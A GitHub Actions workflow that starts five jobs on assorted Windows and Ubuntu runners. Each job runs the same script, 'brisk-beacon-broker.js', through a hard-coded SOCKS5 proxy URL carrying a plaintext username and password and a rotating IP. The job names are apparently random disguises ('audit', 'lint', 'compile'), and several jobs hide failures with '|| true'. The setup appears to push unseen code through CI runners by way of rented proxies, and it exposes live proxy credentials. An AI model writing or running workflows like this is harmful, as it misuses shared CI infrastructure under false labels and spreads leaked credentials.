name: brisk-beacon-broker
on:
  push:
    branches: [ "main" ]
    paths:
      - '.github/workflows/brisk-beacon-broker.yml'
      - 'brisk-beacon-broker.js'
      - 'package.json'

jobs:
  audit_windowslatest_node_fun:
    runs-on: windows-latest
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 24
        - name: Run Task
          shell: pwsh
          run: |
            npm install; node brisk-beacon-broker.js "socks5://dcswarup:webshare@45.38.111.37:5952"

  check_windows2022_node_institute:
    runs-on: windows-2022
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 18
        - name: Run Task
          shell: pwsh
          run: |
            npm install; node brisk-beacon-broker.js "socks5://dcswarup:webshare@64.137.103.205:6793"

  lint_ubuntulatest_bun_ethyl:
    runs-on: ubuntu-latest
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Bun
          uses: oven-sh/setup-bun@v2
          with:
            bun-version: latest
        - name: Run Task
          run: |
            bun install && bun run brisk-beacon-broker.js "socks5://dcswarup:webshare@107.174.4.205:6174" || true

  analyze_ubuntu2404_node_breastplate:
    runs-on: ubuntu-24.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 22
        - name: Run Task
          run: |
            npm install && node brisk-beacon-broker.js "socks5://dcswarup:webshare@23.95.150.40:6009" || true

  compile_ubuntu2004_node_cow:
    runs-on: ubuntu-20.04
    steps:
        - name: Checkout Repository
          uses: actions/checkout@v4
        - name: Setup Node.js
          uses: actions/setup-node@v4
          with:
            node-version: 20
        - name: Run Task
          run: |
            npm install && node brisk-beacon-broker.js "socks5://dcswarup:webshare@45.39.96.138:5551" || true
